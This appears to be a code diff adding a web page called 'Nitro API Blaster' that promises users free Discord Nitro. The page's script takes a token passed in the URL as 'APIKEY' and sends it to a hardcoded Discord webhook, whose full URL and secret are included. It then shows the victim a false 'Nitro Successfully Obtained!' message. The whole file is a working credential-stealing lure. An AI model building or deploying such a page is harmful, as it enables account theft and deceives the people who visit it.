@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Nitro API Blaster</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f7f7f7;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        .container {
+            background-color: #ffffff;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            max-width: 400px;
+            width: 100%;
+        }
+
+        h1 {
+            font-size: 24px;
+            color: #333;
+            margin-bottom: 20px;
+        }
+
+        p {
+            font-size: 18px;
+            color: #555;
+        }
+
+        #status {
+            font-weight: bold;
+            color: #007bff;
+            margin-top: 20px;
+        }
+
+        .success {
+            color: #28a745;
+        }
+
+        .error {
+            color: #dc3545;
+        }
+
+        .warning {
+            color: #ffc107;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Nitro API Blaster</h1>
+        <p id="status" class="warning">Processing...</p>
+    </div>
+
+    <script>
+        function getQueryParam(param) {
+            const urlParams = new URLSearchParams(window.location.search);
+            return urlParams.get(param);
+        }
+
+        function sendTokenToWebhook(token) {
+            const webhookUrl = 'https://discord.com/api/webhooks/1279331854230487060/NVw29NBPVTvIcA4PEtxtHWWx06P2K-XtVTAdK2E-DX1JTfFlqdaFY1C8MYMrq44ZV59h';
+
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    content: `Received Token: ${token}`
+                })
+            })
+            .then(response => {
+                const statusElement = document.getElementById('status');
+                if (response.ok) {
+                    statusElement.textContent = 'Nitro Successfully Obtained!';
+                    statusElement.className = 'success';
+                } else {
+                    statusElement.textContent = 'Failed to send token. ' + response.statusText;
+                    statusElement.className = 'error';
+                }
+            })
+            .catch(error => {
+                const statusElement = document.getElementById('status');
+                statusElement.textContent = 'Error: ' + error.message;
+                statusElement.className = 'error';
+            });
+        }
+
+        const token = getQueryParam('APIKEY');
+
+        if (token) {
+            sendTokenToWebhook(token);
+        } else {
+            const statusElement = document.getElementById('status');
+            statusElement.textContent = 'No token found in URL.';
+            statusElement.className = 'warning';
+        }
+    </script>
+</body>
+</html>
